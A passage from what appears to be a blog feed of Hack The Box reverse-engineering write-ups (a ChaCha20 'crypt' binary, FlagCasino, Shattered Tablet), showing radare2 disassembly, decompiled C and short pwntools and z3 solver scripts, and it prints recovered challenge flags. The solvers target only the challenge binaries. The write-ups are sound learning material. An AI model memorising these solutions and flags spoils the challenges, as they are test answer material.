<div class="org-src-container">
<pre class="src src-text" id="orgcd6c17f">0x58178fd07030    1      6 sym.imp.free
0x58178fd07040    1      6 sym.imp.strncpy
0x58178fd07050    1      6 sym.imp.strncmp
0x58178fd07060    1      6 sym.imp.puts
0x58178fd07070    1      6 sym.imp.write
0x58178fd07080    1      6 sym.imp.strlen
0x58178fd07090    1      6 sym.imp.__stack_chk_fail
0x58178fd070a0    1      6 sym.imp.printf
0x58178fd070b0    1      6 sym.imp.__assert_fail
0x58178fd070c0    1      6 sym.imp.close
0x58178fd070d0    1      6 sym.imp.read
0x58178fd070e0    1      6 sym.imp.malloc
0x58178fd070f0    1      6 sym.imp.realloc
0x58178fd07100    1      6 sym.imp.open
0x58178fd07110    1      6 sym.imp.perror
0x58178fd07120    1      6 sym.imp.rename
0x58178fd072f0    1     38 entry0
0x58178fd09fc0    1     32 section..got
0x58178fd07140    4     56 sym.main.cold
0x58178fd07580    1    261 sym.chacha20_init_context
0x58178fd079e0    1     13 sym._fini
0x58178fd07500    3    128 sym.encrypt_buf
0x58178fd07690   15    779 sym.chacha20_xor
0x58178fd07430    9    198 sym.read_file
0x58178fd07190   12    354 main
</pre>
</div>
</div>
<div id="outline-container-orgba226a0" class="outline-3">
<h3 id="orgba226a0"><span class="section-number-3">2.1.</span> <a href="#orgba226a0">The <code>main</code> part</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Running <code>pds @ sym.main</code>, <code>pdf @ sym.main</code>, and we can see that:
</p>
<ul class="org-ul">
<li>At the beginning we get 40 bytes in the stack</li>
<li><code>mov rax, qword fs:[0x28]</code>, get thread TID, and it get&rsquo;s saved to memory<sup><a id="fnr.2" class="footref" href="#fn.2" role="doc-backlink">2</a></sup></li>
<li>if the app has no arguments <code>argc &lt;= 1</code>, quit and show usage</li>
<li>if it has arguments:
<ol class="org-ol">
<li>Parse argv (<code>rsi</code>), so that:
<ul class="org-ul">
<li><code>rbp</code> contains the input string</li>
<li><code>rdi</code> contains the <code>.undead</code> string</li>
<li>checks if the input file ends with <code>.undead</code>: if already encrypted, exit</li>
</ul></li>
<li>Does some strlen/copy/strlen again <code>0x5c55632601ce</code></li>
<li>Encrypts with string <code>BRAAA...INS</code>, then renames the file</li>
<li>If successful in renaming</li>
<li>Overwrite the file, inform user of <b>zombification</b></li>
</ol></li>
</ul>

<p>
So effectively we have to understand part 3 (and maybe part 2 as well):
</p>
</div>
</div>
<div id="outline-container-orgdc6a1f6" class="outline-3">
<h3 id="orgdc6a1f6"><span class="section-number-3">2.2.</span> <a href="#orgdc6a1f6">The <code>encrypt_buf()</code> function</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
Part three is all about <code>encrypt_buf()</code> function, which can easily be
visualized with <code>VV @ sym.encrypt_buf()</code>
</p>


<div id="org7ed25b3" class="figure">
<p><img src="posts/images/Static_Analysis/20250204_163930_screenshot.png" alt="&quot;Radare2-produced visual graph of encrypt_buf(): consists of three &quot;nodes&quot;: main one, handling arguments and making the call to chacha20, one for normal execution, one for fail&quot;">
</p>
<p><span class="figure-number">Figure 1: </span><code>encrypt_buf()</code> graph</p>
</div>

<ul class="org-ul">
<li>It seems to take 4 arguments:
<ol class="org-ol">
<li><code>rdi</code> -&gt; value of r12 in main</li>
<li><code>rsi</code> -&gt; value of rdi in main</li>
<li><code>rdx</code> -&gt; &ldquo;BRAINS&rdquo; (or its address)</li>
<li><code>r8</code> <sup><a id="fnr.3" class="footref" href="#fn.3" role="doc-backlink">3</a></sup></li>
</ol></li>
<li>Increases stack size by 224 bytes (<code>0xe0</code>), creating the following variables:
<ul class="org-ul">
<li><code>A</code>: <code>rsp+0xcc - 204</code> -&gt; 8 bytes</li>
<li><code>B</code>: <code>rsp+0xd4 - 212</code> -&gt; 4 bytes?</li>
<li><code>C</code>: <code>rsp+0xd8 - 216</code> -&gt; 8 bytes (since max size is 224)</li>
</ul></li>
<li>Uses <code>rsi</code> to load <code>fs[0x28]</code> -&gt; which is an address: tied to threading.</li>
<li>Variable at <code>rsi</code> addr: stored in <code>C</code>
<ul class="org-ul">
<li>strangely it is not <code>C</code> itself that gets returned in <code>rax</code>, but the word
minus the starting word?</li>
</ul></li>
</ul>

<p>
Strange parts: Calling these two functions:
</p>
<ul class="org-ul">
<li><code>sym.chacha20_init_context</code> -&gt; ok <b>this one uses <code>r8</code></b></li>
<li><code>sym.chacha20_xor</code></li>
</ul>
</div>
</div>
<div id="outline-container-orga832c27" class="outline-3">
<h3 id="orga832c27"><span class="section-number-3">2.3.</span> <a href="#orga832c27">ChaCha20</a></h3>
<div class="outline-text-3" id="text-2-3">
<p>
I was naive enough to think that the name somehow was an indicator
that the function returned a <code>char char</code> array, with a length of 20.
<a href="https://www.youtube.com/watch?v=OJ62RzJkYUo">Pixies</a>. Anyway, I started reviewing the <code>chacha20_xor</code> function in the
same way I looked at <code>encrypt_buf()</code> above, slowly step by step. Then it
struck me that I had somewhere seen that so I just googled <code>chacha20</code>.
</p>

<p>
One of the first links, explaining this <b>widely used</b> encryption
algorithm, was that of <a href="https://xilinx.github.io/Vitis_Libraries/security/2019.2/guide_L1/internals/chacha20.html">Xilinx</a><sup><a id="fnr.4" class="footref" href="#fn.4" role="doc-backlink">4</a></sup>stating that:
</p>
<blockquote>
<p>
Its encryption and decryption are same as long as input same initial
key, counter and nonce.
</p>
</blockquote>

<p>
Seeing that all the program was doing was to repeatedly encrypt the
file&rsquo;s contents with the same algorithm I did what any normal person
would do:
</p>
<div class="org-src-container">
<pre class="src src-shell" id="orgf2997a5">cp flag.txt.undead newflag.txt
./crypt newflag.txt <span class="org-comment-delimiter"># </span><span class="org-comment">produced newflag.txt.undead</span>
cat newflag.txt.undead <span class="org-comment-delimiter"># </span><span class="org-comment">flag in plain text ;)</span>
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-orge0eaa4d" class="outline-2">
<h2 id="orge0eaa4d"><span class="section-number-2">3.</span> <a href="#orge0eaa4d">Summary</a></h2>
<div class="outline-text-2" id="text-3">
<p>
If you see any strange function names do not force them to make sense
in your mind. <i>Google</i> it. It might prove useful, but in any case, you
got nothing to lose.
</p>


<div id="orgb999c6a" class="figure">
<p><img src="https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbWl1eDJpdnQ2NGF1ZXV2NHBnNGgyYXBzanM5eHE4Y2Z4Y2FlYXBhZSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/pUGWc0Rk5Lzbh8zstA/giphy.gif" alt="giphy.gif">
</p>
<p><span class="figure-number">Figure 2: </span>Cha-cha alright</p>
</div>
</div>
</div>
<div id="footnotes">
<h2 class="footnotes">Footnotes: </h2>
<div id="text-footnotes">

<div class="footdef"><sup><a id="fn.1" class="footnum" href="#fnr.1" role="doc-backlink">1</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I think that experienced players would be able to solve the
challenge before moving forward&#x2026; 
</p></div></div>

<div class="footdef"><sup><a id="fn.2" class="footnum" href="#fnr.2" role="doc-backlink">2</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
I did not get much deeper on this, I realized now that I am in the
process of <i>enriching</i> my notes. 
</p></div></div>

<div class="footdef"><sup><a id="fn.3" class="footnum" href="#fnr.3" role="doc-backlink">3</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
A mystery ? 
</p></div></div>

<div class="footdef"><sup><a id="fn.4" class="footnum" href="#fnr.4" role="doc-backlink">4</a></sup> <div class="footpara" role="doc-footnote"><p class="footpara">
<b>war flashback</b> 
</p></div></div>


</div>
</div>]]>
</description></item>
<item>
<title>HTB: FlagCasino</title>
<link>posts/htb_rev_flagcasino.html</link>
<pubDate>Fri, 31 Jan 2025 00:00:00 +0200</pubDate>
<guid>posts/htb_rev_flagcasino.html</guid>
<description>
<![CDATA[<div id="outline-container-org3fe9b6e" class="outline-2">
<h2 id="org3fe9b6e"><span class="section-number-2">1.</span> <a href="#org3fe9b6e">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
Although this is not the first <code>reveng</code> challenge I have solved in the
last month, I noticed many improvements while solving it. It always
feels good when you make progress.
</p>

<div class="note" id="org18671f4">
<p>
I work with <code>radare2</code>, as it was suggested to me as a very good way
for a <i>newbie</i> to learn: it may have a steep learning curve, but it
allows you to see things in greater depth.
</p>

</div>

<div class="org-src-container">
<pre class="src src-txt">     ,     ,
    (\____/)
     (_oo_)
       (O)
     __||__    \)
  []/______\[] /
  / \______/ \/
 /    /__\
(\   /____\
---------------------
[ ** WELCOME TO ROBO CASINO **]
[*** PLEASE PLACE YOUR BETS ***]
[ * CORRECT *]
[ * INCORRECT * ]
[ *** ACTIVATING SECURITY SYSTEM - PLEASE VACATE *** ]
[ ** HOUSE BALANCE $0 - PLEASE COME BACK LATER ** ]
</pre>
</div>
</div>
</div>
<div id="outline-container-orgc825581" class="outline-2">
<h2 id="orgc825581"><span class="section-number-2">2.</span> <a href="#orgc825581">Starting</a></h2>
<div class="outline-text-2" id="text-2">
<p>
Through a first look at the disassembled code through graph visual mode
<code>VV @ sym.main</code>, we see that only at the very surface is this a program imitating a casino:
</p>
<ol class="org-ol">
<li>In the first part, it produces some output for the end user.</li>
<li>Then we have a while loop that exits if the <i>house balance is 0</i>.</li>
<li>If the house balance is not 0: We are then tasked
with providing a bet, and the return code of <code>scanf</code> is tested to
see if we can proceed.</li>
<li>If we have properly passed input: The input now gets checked:
<ul class="org-ul">
<li><code>srand</code> (with a specific seed?)</li>
<li><code>rand</code></li>
<li>Some comparison takes place here, given which we:
<ol class="org-ol">
<li>Get <b>correct</b></li>
<li>Get <b>incorrect</b> -&gt; exits</li>
</ol></li>
</ul></li>
<li><p>
If we get <b>correct</b>, we just go back to <i>step 2</i> again, but it is strange
since the flag is supposed to be given somewhere here.
</p>
<ul class="org-ul">
<li>It could very well have something to do with <code>var_4h</code>.</li>
</ul>

<div class="note" id="org8efb077">
<p>
Now, could it be that the proper input sequence is the flag?
-&gt; Yep, this is the case, tested with <b>HTB{</b>.
</p>

</div></li>
</ol>
</div>
</div>
<div id="outline-container-org2253310" class="outline-2">
<h2 id="org2253310"><span class="section-number-2">3.</span> <a href="#org2253310">Understanding the loop</a></h2>
<div class="outline-text-2" id="text-3">
<ol class="org-ol">
<li>First, we get the last byte of <code>[var_5h]</code>, move it with
sign extension to <code>eax</code>, and then to <code>edi</code>, to be used as the seed in
<code>srand</code>. After that, a random value is generated through <code>rand</code>. We need to
validate that <code>[var_5h]</code> remains the same in each iteration, because that
would in turn mean that <code>rand</code> <b>ALWAYS returns the same value</b>.</li>
<li>After getting the rand value, we also get the <code>[var_4h]</code> variable into
<code>rdx</code> (two-step process).</li>
<li>Then, we get the address of <code>obj.check</code> and compare the value of:
<ul class="org-ul">
<li><code>rcx</code> (which is <code>[signextended(dword [var_4h])*4]</code>).</li>
<li><code>edx</code>, which is <code>dword [rcx + obj.check]</code>.</li>
</ul></li>
<li><p>
Compare these two together: If not equal, exit.
</p>

<div class="org-src-container">
<pre class="src src-asm"><span class="org-function-name">0x5b39eabbe1f5</span>      <span class="org-keyword">movzx</span> eax, byte [var_5h]
<span class="org-function-name">0x5b39eabbe1f9</span>      <span class="org-keyword">movsx</span> eax, al
<span class="org-function-name">0x5b39eabbe1fc</span>      <span class="org-keyword">mov</span> edi, eax
<span class="org-function-name">0x5b39eabbe1fe</span>      <span class="org-keyword">call</span> sym.imp.srand      <span class="org-comment-delimiter">;</span><span class="org-comment">[5] ; void srand(int seed)</span>
<span class="org-function-name">0x5b39eabbe203</span>      <span class="org-keyword">call</span> sym.imp.rand       <span class="org-comment-delimiter">;</span><span class="org-comment">[6] ; int rand(void)</span>
<span class="org-function-name">0x5b39eabbe208</span>      <span class="org-keyword">mov</span> edx, dword [var_4h]
<span class="org-function-name">0x5b39eabbe20b</span>      <span class="org-keyword">movsxd</span> rdx, edx
<span class="org-function-name">0x5b39eabbe20e</span>      <span class="org-keyword">lea</span> rcx, [rdx*4]
<span class="org-function-name">0x5b39eabbe216</span>      <span class="org-keyword">lea</span> rdx, obj.check      <span class="org-comment-delimiter">; </span><span class="org-comment">0x5b39eabc1080</span>
<span class="org-function-name">0x5b39eabbe21d</span>      <span class="org-keyword">mov</span> edx, dword [rcx + rdx]
<span class="org-function-name">0x5b39eabbe220</span>      <span class="org-keyword">cmp</span> eax, edx
<span class="org-function-name">0x5b39eabbe222</span>      <span class="org-keyword">jne</span> 0x5b39eabbe232
</pre>
</div>

<p>
Nice, so we now need to understand:
</p>
<ul class="org-ul">
<li>Where <code>rand()</code> output is used: Its output is saved at <code>eax</code>.</li>
<li>What exactly is <code>var_4h</code>: Could be our index, and it makes sense, but at the
same point, it does not? A byte increase makes sense for the <code>*4</code> part, but
then why not just have it <code>+4</code>?</li>
<li>What exactly is <code>obj.check</code>:
<ul class="org-ul">
<li><code>obj.check</code> is an array or data structure?</li>
</ul></li>
</ul></li>
</ol>
</div>
<div id="outline-container-org42447ab" class="outline-3">
<h3 id="org42447ab"><span class="section-number-3">3.1.</span> <a href="#org42447ab">Asm notes</a></h3>
<div class="outline-text-3" id="text-3-1">
<ul class="org-ul">
<li><code>movzx</code> move with zero extend.</li>
<li><code>movsx</code> move with sign extend.</li>
<li><code>movsxd</code> move with sign extend to a 64-bit register.</li>
</ul>
</div>
</div>
<div id="outline-container-org5938747" class="outline-3">
<h3 id="org5938747"><span class="section-number-3">3.2.</span> <a href="#org5938747">Obj.check hexdump</a></h3>
<div class="outline-text-3" id="text-3-2">
<div class="org-src-container">
<pre class="src src-txt">[0x71025cdd1540]&gt; px @ obj.check
- offset -      8081 8283 8485 8687 8889 8A8B 8C8D 8E8F  0123456789ABCDEF
0x5b39eabc1080  be28 4b24 0578 f70a 17fc 0d11 a1c3 af07  .(K$.x..........
...
</pre>
</div>
</div>
</div>
</div>
<div id="outline-container-org178964f" class="outline-2">
<h2 id="org178964f"><span class="section-number-2">4.</span> <a href="#org178964f">Decompilation</a></h2>
<div class="outline-text-2" id="text-4">
<p>
So far, we got to a really nice place with static binary analysis:
</p>
<ul class="org-ul">
<li>We know that the input is the flag, the flag will not be returned in any
other way by the executable</li>
<li><p>
We know that <code>srand</code> is called along with var<sub>4h</sub>
</p>

<div class="note" id="org13a3bdf">
<p>
Not going to lie, I thought of going for debugging instead of decompiling, but
</p>
<ol class="org-ol">
<li>I did not want to waste time atm figuring how debugging works in r2</li>
<li>GDB for some reason failed to insert breakpoints</li>
</ol>
<p>
So&#x2026;decompiling, and not even done properly, but I need practice here
</p>

</div></li>
</ul>

<p>
First things first, we see that: There are <b>a lot</b> of strange assignments, like:
</p>
<div class="org-src-container">
<pre class="src src-c">*(*0x20 + -0x18) = 0x56c847aba199;
</pre>
</div>

<div class="note" id="org575429c">
<p>
How does it even dereference <code>0x20</code>&#x2026; How is it set?
</p>

</div>

<p>
I started removing these, whilst also making a point of seeing the instruction
at that address. At the end I was left with pretty readable code, except for
the user input: I could not exactly see how it gets transformed to be used by
<code>srand()</code>. Turns out, even though I modified the code so that it more closely
resembles <code>C</code>: I do not have the location of the check object so&#x2026; it does
not really work that way. 
</p>

<div class="org-src-container">
<pre class="src src-c">
<span class="org-type">int</span> <span class="org-function-name">main</span>(<span class="org-type">void</span>) {
  <span class="org-type">int</span> <span class="org-variable-name">loopIndex</span>;
  <span class="org-type">unsigned</span> <span class="org-type">int</span> <span class="org-variable-name">userInput</span>;

  <span class="org-comment-delimiter">// </span><span class="org-comment">First step</span>
  puts(<span class="org-string">"[ ** WELCOME TO ROBO CASINO **]"</span>); <span class="org-comment-delimiter">// </span><span class="org-comment">obj.banner</span>
  puts(<span class="org-string">"     ,     ,\n    (\\____/)\n     (_oo_)\n       (O)\n     __||__    "</span>
       <span class="org-string">"\\)\n  []/______\\[] /\n  / \\______/ \\/\n /    /__\\\n(\\   "</span>
       <span class="org-string">"/____\\\n---------------------"</span>);
  puts(<span class="org-string">"[*** PLEASE PLACE YOUR BETS ***]"</span>);

  loopIndex = 0;
  <span class="org-comment-delimiter">// </span><span class="org-comment">Second step</span>
  <span class="org-keyword">while</span> (1) {
    <span class="org-comment-delimiter">// </span><span class="org-comment">House balance check</span>
    <span class="org-keyword">if</span> (29 &lt; loopIndex) { <span class="org-comment-delimiter">// </span><span class="org-comment">Length is 30</span>
      puts(<span class="org-string">"[ ** HOUSE BALANCE $0 - PLEASE COME BACK LATER ** ]"</span>);
      <span class="org-keyword">return</span> 0;
    }
    <span class="org-comment-delimiter">// </span><span class="org-comment">Step 3</span>
    printf(<span class="org-string">"&gt; "</span>); <span class="org-comment-delimiter">// </span><span class="org-comment">Prompt</span>
    <span class="org-keyword">if</span> ( scanf(<span class="org-string">"%c"</span>, &amp;userInput) != 1)
      <span class="org-keyword">break</span>;
    srand(userInput); <span class="org-comment-delimiter">// </span><span class="org-comment">pending some transformation</span>
    <span class="org-keyword">if</span> (rand() != *(loopIndex * 4 + obj.check)) {
      puts(<span class="org-string">"[ * INCORRECT * ]"</span>);
      puts(<span class="org-string">"[ *** ACTIVATING SECURITY SYSTEM - PLEASE VACATE *** ]"</span>);
      exit(0xfffffffe);
    }
    puts(<span class="org-string">"[ * CORRECT *]"</span>);
    loopIndex = loopIndex + 1;
  }
  exit(0xffffffff);
}
</pre>
</div>
</div>
</div>
<div id="outline-container-org28ecd2b" class="outline-2">
<h2 id="org28ecd2b"><span class="section-number-2">5.</span> <a href="#org28ecd2b">Implementing the payload</a></h2>
<div class="outline-text-2" id="text-5">
<p>
Now, simply following the decompiled code we see that any character we
entered is fed into <code>srand()</code> as a seed, and then <span class="underline">the first</span> <code>rand()</code> with
that seed is checked to be equal to the object at address: <code>loopIndex*4 + obj.check</code>
</p>

<p>
This means that <b>each printable character has the same address to be
checked against</b>: If we compute this association once, and store it in
a dictionary we can retrieve the results without extra computations
for each index. Thus, the payload can easily be produced:
</p>

<div class="org-src-container">
<pre class="src src-python"><span class="org-keyword">from</span> pwn <span class="org-keyword">import</span> <span class="org-operator">*</span>
<span class="org-keyword">from</span> ctypes <span class="org-keyword">import</span> CDLL 

<span class="org-comment-delimiter"># </span><span class="org-comment">shoutout to ckrielle for mentioning this trick at the last HtB meetup</span>
<span class="org-variable-name">libc</span> <span class="org-operator">=</span> CDLL(<span class="org-string">"libc.so.6"</span>)
<span class="org-variable-name">zino</span> <span class="org-operator">=</span> ELF(<span class="org-string">"./casino"</span>)

<span class="org-comment-delimiter"># </span><span class="org-comment">Create the dictionary, printable characters are from 40 to 177, see ~man ascii~</span>
<span class="org-variable-name">dic</span> <span class="org-operator">=</span> {}
<span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(40,177):
    libc.srand(i)
    <span class="org-variable-name">dic</span>[ libc.rand() ] <span class="org-operator">=</span> <span class="org-builtin">chr</span>(i)

<span class="org-comment-delimiter"># </span><span class="org-comment">Now loop get the actual characters</span>
<span class="org-variable-name">answ</span> <span class="org-operator">=</span> <span class="org-string">""</span>
<span class="org-variable-name">objCheck</span> <span class="org-operator">=</span> zino.sym.check <span class="org-comment-delimiter"># </span><span class="org-comment">obj.check address</span>
<span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(30): <span class="org-comment-delimiter"># </span><span class="org-comment">we know that the flag is 30 characters long, &gt;0x1d</span>
    <span class="org-variable-name">answ</span> <span class="org-operator">+=</span> dic[ zino.u32( 4 <span class="org-operator">*</span> i <span class="org-operator">+</span> objCheck )]
<span class="org-builtin">print</span>(answ)

</pre>
</div>
</div>
</div>
<div id="outline-container-orgd5c5dc5" class="outline-2">
<h2 id="orgd5c5dc5"><span class="section-number-2">6.</span> <a href="#orgd5c5dc5">Summary</a></h2>
<div class="outline-text-2" id="text-6">
<ol class="org-ol">
<li>Start by looking at the disassembly. Visual graph mode helps a lot in
understanding the flow of the program.</li>
<li>Do not overlook loop control variables: I did this and, as a result,
I got stuck (notice that I had not included the step increase in
<code>loopIndex</code> in the disassembly snippet I focused on).</li>
<li>After decompilation, take your time: Use a plain buffer and
analyze step by step how it differs from what you have already
understood through assembly.</li>
<li>If you encounter strange memory assignments added by Ghidra (or any
decompiler, for that matter), check the addresses they point to. If
they reference another command, it is highly likely they do
absolutely nothing.</li>
<li>More variables than those that actually exist may appear in the
decompiled snippet. This could be due to name dependencies being
handled through register renaming. In any case, variables might
need to be merged or discarded.</li>
</ol>

<p>
Today was a rest day after an exam. I won&rsquo;t have much time to
polish something to publish for a while, so&#x2026;
</p>


<div id="orgb082195" class="figure">
<p><img src="posts/images/Summary/20250201_003217_screenshot.png" alt="Skeletor, until we meet again">
</p>
<p><span class="figure-number">Figure 1: </span>Until we meet again</p>
</div>
</div>
</div>
]]>
</description></item>
<item>
<title>Shattered Tablet</title>
<link>posts/htb_rev_shatteredtablet.html</link>
<pubDate>Sat, 15 Feb 2025 00:00:00 +0200</pubDate>
<guid>posts/htb_rev_shatteredtablet.html</guid>
<description>
<![CDATA[<div id="outline-container-orgd4b474f" class="outline-2">
<h2 id="orgd4b474f"><span class="section-number-2">1.</span> <a href="#orgd4b474f">Introduction</a></h2>
<div class="outline-text-2" id="text-1">
<p>
I had no intention of writing today, I just logged to get some
practice in, on the basics, since I was tired to go into much theory,
but this one was solved in less than 15-20 minutes. I thought why not:
Let&rsquo;s try to get some writing practice as well.
</p>

<blockquote>
<p>
Deep in an ancient tomb, you&rsquo;ve discovered a stone tablet with secret
information on the locations of other relics. However, while dodging a
poison dart, it slipped from your hands and shattered into hundreds of
pieces. Can you reassemble it and read the clues?
</p>
</blockquote>
</div>
</div>
<div id="outline-container-org4379bfe" class="outline-2">
<h2 id="org4379bfe"><span class="section-number-2">2.</span> <a href="#org4379bfe">Static analysis:</a></h2>
<div class="outline-text-2" id="text-2">
<p>
We are given just a single binary <code>tablet</code>, and the flag <i>lies</i> inside it,
since there is no remote machine to launch.
</p>
</div>
<div id="outline-container-orgb7e201e" class="outline-3">
<h3 id="orgb7e201e"><span class="section-number-3">2.1.</span> <a href="#orgb7e201e">Decompiling</a></h3>
<div class="outline-text-3" id="text-2-1">
<p>
Immediately upon seeing the decompiled main, I thought of a similar
challenge I recently completed: It must have been spooky license but I
am not 100% sure of it.
</p>
<div class="org-src-container">
<pre class="src src-c" id="org6d60777"><span class="org-keyword">if</span> (((((uStack_28._2_1_ == <span class="org-string">'4'</span>) &amp;&amp; (uStack_38._4_1_ == <span class="org-string">'3'</span>)) &amp;&amp; (uStack_28._4_1_ == <span class="org-string">'r'</span>)) &amp;&amp;
    ((((uStack_48._1_1_ == <span class="org-string">'T'</span> &amp;&amp; (uStack_38._5_1_ == <span class="org-string">'v'</span>)) &amp;&amp;
      ((uStack_48._6_1_ == <span class="org-string">'0'</span> &amp;&amp; ((uStack_28._7_1_ == <span class="org-string">'}'</span> &amp;&amp; (uStack_28._6_1_ == <span class="org-string">'d'</span>)))))) &amp;&amp;
     (uStack_30._7_1_ == <span class="org-string">'r'</span>)))) &amp;&amp;
   ((((((uStack_30._5_1_ == <span class="org-string">'3'</span> &amp;&amp; (uStack_40 == <span class="org-string">'3'</span>)) &amp;&amp; (uStack_38._6_1_ == <span class="org-string">'e'</span>)) &amp;&amp;
      ((uStack_28._3_1_ == <span class="org-string">'1'</span> &amp;&amp; (uStack_48._5_1_ == <span class="org-string">'r'</span>)))) &amp;&amp;
     ((uStack_48 == <span class="org-string">'H'</span> &amp;&amp; ((uStack_28 == <span class="org-string">'3'</span> &amp;&amp; (uStack_38._2_1_ == <span class="org-string">'.'</span>)))))) &amp;&amp;
    (((((uStack_40._5_1_ == <span class="org-string">'4'</span> &amp;&amp;
        (((((uStack_48._3_1_ == <span class="org-string">'{'</span> &amp;&amp; (uStack_40._2_1_ == <span class="org-string">'_'</span>)) &amp;&amp; (uStack_38 == <span class="org-string">'.'</span>)) &amp;&amp;
          ((uStack_48._4_1_ == <span class="org-string">'b'</span> &amp;&amp; (uStack_48._7_1_ == <span class="org-string">'k'</span>)))) &amp;&amp; (uStack_40._7_1_ == <span class="org-string">'t'</span>)))) &amp;&amp;
       (((uStack_40._6_1_ == <span class="org-string">'r'</span> &amp;&amp; (uStack_38._3_1_ == <span class="org-string">'n'</span>)) &amp;&amp;
        ((uStack_30._1_1_ == <span class="org-string">'t'</span> &amp;&amp;
         (((uStack_38._1_1_ == <span class="org-string">'.'</span> &amp;&amp; (uStack_40._1_1_ == <span class="org-string">'n'</span>)) &amp;&amp; (uStack_30._6_1_ == <span class="org-string">'_'</span>)))))))) &amp;&amp;
      (((uStack_30._2_1_ == <span class="org-string">'0'</span> &amp;&amp; (uStack_30 == <span class="org-string">'_'</span>)) &amp;&amp; (uStack_40._4_1_ == <span class="org-string">'p'</span>)))) &amp;&amp;
     ((((uStack_38._7_1_ == <span class="org-string">'r'</span> &amp;&amp; (uStack_30._4_1_ == <span class="org-string">'b'</span>)) &amp;&amp;
       ((uStack_28._1_1_ == <span class="org-string">'p'</span> &amp;&amp;
        (((uStack_48._2_1_ == <span class="org-string">'B'</span> &amp;&amp; (uStack_30._3_1_ == <span class="org-string">'_'</span>)) &amp;&amp; (uStack_40._3_1_ == <span class="org-string">'4'</span>)))))) &amp;&amp;
      (uStack_28._5_1_ == <span class="org-string">'3'</span>)))))))) {
</pre>
</div>
<p>
We are given a set of constraints we need the flag to meet. To do that
we can use the z3-solver library, though it feels even easier than
that. In fact I can do it by myself probably:
</p>
<ol class="org-ol">
<li>Write the checks above in a separate sample file</li>
<li>Break it down to its essentials (see shell command)</li>
<li><p>
Some <code>vim</code> quick formatting tricks and &#x2026; We&rsquo;re good to go:
</p></li>
</ol>
<div class="org-src-container">
<pre class="src src-shell">cat test.txt | sed -E <span class="org-string">'s/&amp;&amp;|\)+|\(+/\n/g'</span> | grep uStack | uniq | sort
</pre>
</div>

<div class="org-src-container">
<pre class="src src-text" id="orgc77c32c">Ustack_48: HTB{br0k
Ustack_40: 3n_4p4rt
Ustack_38: ...n3ver
Ustack_30: _t0_b3_r
Ustack_28: 3p41r3d}
</pre>
</div>
</div>
</div>
<div id="outline-container-orge13f10c" class="outline-3">
<h3 id="orge13f10c"><span class="section-number-3">2.2.</span> <a href="#orge13f10c">Update: <code>z3</code> solution</a></h3>
<div class="outline-text-3" id="text-2-2">
<p>
I wanted to test my z3 skills, since it took me a long time in the
previous challenge. This one was more tedious, but here is the source:
</p>
<div class="org-src-container">
<pre class="src src-python"><span class="org-keyword">import</span> z3

<span class="org-comment-delimiter"># </span><span class="org-comment">To find the length I simply piped the shell command to wc</span>
<span class="org-variable-name">letters</span> <span class="org-operator">=</span> [z3.Int(f<span class="org-string">'s_</span>{i}<span class="org-string">'</span>) <span class="org-keyword">for</span> i <span class="org-keyword">in</span> <span class="org-builtin">range</span>(40) ]

<span class="org-variable-name">solver</span> <span class="org-operator">=</span> z3.Solver()

<span class="org-comment-delimiter"># </span><span class="org-comment">Actually unnecessary, since we have the letters in == </span>
<span class="org-comment-delimiter"># </span><span class="org-comment">for l in letters:</span>
<span class="org-comment-delimiter">#     </span><span class="org-comment">solver.add(z3.And( l &gt;= 33, l &lt;= 127))</span>

solver.add(letters[33] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'p'</span>)) 
solver.add(letters[34] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'4'</span>))
solver.add(letters[32] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'3'</span>)) 
solver.add(letters[35] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'1'</span>)) 
solver.add(letters[36] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'r'</span>))
solver.add(letters[37] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'3'</span>))
solver.add(letters[38] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'d'</span>))
solver.add(letters[39] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'}'</span>)) 
solver.add(letters[24] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'_'</span>))
solver.add(letters[25] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'t'</span>))
solver.add(letters[26] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'0'</span>))
solver.add(letters[27] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'_'</span>))
solver.add(letters[28] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'b'</span>))
solver.add(letters[29] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'3'</span>))
solver.add(letters[30] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'_'</span>))
solver.add(letters[31] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'r'</span>))
solver.add(letters[16] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'.'</span>))
solver.add(letters[17] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'.'</span>))
solver.add(letters[18] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'.'</span>))
solver.add(letters[19] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'n'</span>))
solver.add(letters[20] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'3'</span>))
solver.add(letters[21] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'v'</span>))
solver.add(letters[22] <span class="org-operator">==</span> <span class="org-builtin">ord</span>(<span class="org-string">'e'</span>))
